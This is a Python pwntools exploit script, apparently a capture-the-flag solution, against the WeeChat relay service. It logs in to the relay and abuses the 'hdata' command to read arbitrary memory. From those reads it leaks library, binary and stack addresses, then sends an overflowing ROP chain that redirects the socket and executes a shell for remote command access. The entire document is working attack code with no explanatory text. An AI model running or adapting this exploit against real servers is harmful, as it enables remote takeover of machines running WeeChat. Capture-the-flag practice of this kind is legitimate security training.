import argparse
import os
import zlib

from pwn import *

debug = False

context.log_level = 'debug' if debug else 'info'
context.terminal = ['tmux', 'splitw', '-v']
context.arch = 'amd64'

PATH = "/weechat/bin/weechat-headless"
LIBC = "/solve/libc.so.6"
LD = "/solve/ld-linux-x86-64.so.2"
# e = ELF(PATH)
# libc = ELF(LIBC)

network = len(sys.argv) > 1

if network:
    parser = argparse.ArgumentParser()
    default_addr = os.environ.get("HOST", "weechal.chal.hackthe.vote") + ":" + os.environ.get("PORT", "1337")
    parser.add_argument("--network", action='store_true')
    parser.add_argument("address", default=default_addr,
                        nargs="?", help="Address of challenge")
    args = parser.parse_args()
    HOST, PORT = args.address.split(':')

    r = remote(HOST, int(PORT))
else:
#    r = process(PATH)
    if not os.path.exists('/root/.config/weechat/'):
        os.makedirs('/root/.config/weechat/')
        with open("/root/.config/weechat/relay.conf", 'w') as f:
            f.write('''
[network]
allow_empty_password = off
allowed_ips = ""
auth_timeout = 60
bind_address = ""
clients_purge_delay = 0
compression_level = 6
ipv6 = on
max_clients = 5
nonce_size = 16
password = "ctf"
password_hash_algo = "*"
password_hash_iterations = 100000
ssl_cert_key = "${weechat_config_dir}/ssl/relay.pem"
ssl_priorities = "NORMAL:-VERS-SSL3.0"
totp_secret = ""
totp_window = 0
websocket_allowed_origins = ""

[port]
weechat = 12345
''')
    g = gdb.debug([PATH, "--stdout"], f'''
file {PATH}
break *main
c
c
''', api=True)
    r = remote("127.0.0.1", 12345)

# Log into the relay

r.sendline(b'init password=ctf,compression=none')


def read_pkt():
    buf = r.recvn(4, timeout=1)
    if len(buf) == 0:
        return None
    length = u32(buf[::-1])
    compressed = u8(r.recvn(1))
    buffer = r.recvn(length - 5)

    if compressed == 1:
        buffer = zlib.decompress(buffer)
    # log.maybe_hexdump(buffer)
    return buffer


def read64(addr):
    r.sendline(f'hdata window_tree:{addr - 8:#x}(1) split_horizontal,split_pct'.encode())
    result = read_pkt()
    bytes = result[-8:]
    return u64(bytes[::-1])


def readN(addr, n):
	buf = b''
	for i in range(0, n, 8):
		buf += p64(read64(addr + i))
	return buf


r.sendline(b'infolist buffer')
buffers = read_pkt()

buf = int(buffers[0x28:0x34], 16)
print(f"Buf at {buf:#x}")
buf_data = readN(buf, 0x248)
log.maybe_hexdump(buf_data)

buf2 = u64(buf_data[0x240:0x248])
print(f"Buf2 at {buf2:#x}")
buf2_data = readN(buf2, 0x248)
log.maybe_hexdump(buf2_data)

relay_so = u64(buf2_data[0x68:0x70]) - (0x7fcd149cca00-0x7fcd149c2000)
print(f"relay.so at {relay_so:#x}")
relay_so_data = readN(relay_so + 0x2c000, 0x100)
log.maybe_hexdump(relay_so_data)

libc_so = u64(relay_so_data[0x20:0x28]) - (0x7fcd15775e70-0x7fcd1569d000)
print(f"libc.so at {libc_so:#x}")
libc_so_data = readN(libc_so, 0x100)
log.maybe_hexdump(libc_so_data)

plugin_buf = u64(buf2_data[0x0:0x8])
print(f"plugin_buf at {plugin_buf:#x}")
plugin_buf_data = readN(plugin_buf, 0x100)
log.maybe_hexdump(plugin_buf_data)

weechat_exe = u64(plugin_buf_data[0x80:0x88]) - (0x55c526afa0d0-0x55c526a98000)
print(f"weechat.exe at {weechat_exe:#x}")
weechat_exe_data = readN(weechat_exe + 0x108a00, 0x100)
log.maybe_hexdump(weechat_exe_data)

stack = u64(weechat_exe_data[0x20:0x28])
print(f"stack at {stack:#x}")

log.maybe_hexdump(readN(stack - 0x300, 0x100))

# test env
# scratch_space = read64(stack - 0x280)
# prod env apparently
scratch_space = read64(stack - 0x260)

print(f"scratch at {scratch_space:#x}")

r.sendline(b'A' * 0x80 + b''.join(p64(a) for a in [
    scratch_space + 0x1a0,  #rdx, rbp, r11
    weechat_exe + 0x7fb72,
    relay_so + 0x14a86,
    scratch_space,
    scratch_space,
    scratch_space,
    0xcccccccccccccccc,
    0xcccccccccccccccc,
    0xcccccccccccccccc,
    0xcccccccccccccccc,
    0xcccccccccccccccc,
    0xcccccccccccccccc,
    0xcccccccccccccccc,
    0xcccccccccccccccc,
    0xcccccccccccccccc,
    0xcccccccccccccccc,
    0xcccccccccccccccc,
    0xcccccccccccccccc,
    0xcccccccccccccccc,
    0xcccccccccccccccc,
    0xcccccccccccccccc,
    0xcccccccccccccccc,
    0xcccccccccccccccc,
    0xcccccccccccccccc,
    0xcccccccccccccccc,
    0xcccccccccccccccc,
    0xcccccccccccccccc,
    0xcccccccccccccccc,
    0xcccccccccccccccc,
    0xcccccccccccccccc,
    0xcccccccccccccccc,
    0xcccccccccccccccc,
    #0x1234123412341234,
    #libc_so + 0xebc85,
    weechat_exe + 0x0002c6cb, # leave ; retn
    0x0000000000001337, # rdi
    0x0000000013370000, # rsi

    relay_so + 0x14a86,
    relay_so + 0x14a86,
] + [
    weechat_exe + 0x00062a50, # pop rax ; retn
    33,
    weechat_exe + 0x0002bad6, # pop rdi ; retn
    7,
    weechat_exe + 0x0002d760, # pop rsi ; retn
    0,
    libc_so + 0x91316, # syscall ; retn
    weechat_exe + 0x00062a50, # pop rax ; retn
    33,
    weechat_exe + 0x0002bad6, # pop rdi ; retn
    7,
    weechat_exe + 0x0002d760, # pop rsi ; retn
    1,
    libc_so + 0x91316, # syscall ; retn
    weechat_exe + 0x00062a50, # pop rax ; retn
    33,
    weechat_exe + 0x0002bad6, # pop rdi ; retn
    7,
    weechat_exe + 0x0002d760, # pop rsi ; retn
    2,
    libc_so + 0x91316, # syscall ; retn
    relay_so + 0x0000a028, # pop rdx ; pop rbx ; retn
    0,
    0,
    weechat_exe + 0x00062a50, # pop rax ; retn
    59,
    weechat_exe + 0x0002bad6, # pop rdi ; retn
    libc_so + 0x1d8678,
    weechat_exe + 0x0002d760, # pop rsi ; retn
    0,
    #relay_so + 0x14a86, # int3 ; retn
    libc_so + 0x91316, # syscall ; retn
]))

log.maybe_hexdump(readN(scratch_space, 0x200))

print("ENTER to go")
input()

r.sendline(f'input {scratch_space+0x80:#x} test'.encode())

r.interactive()

# input()


# while True:
#     i = input()
#     if i[0:2] == '0x':
#         log.maybe_hexdump(readN(int(i, 0),0x100))
#     else:
#         r.sendline(i)
#         response = read_pkt()
#         if response is not None:
#             log.maybe_hexdump(response)


# r.interactive()

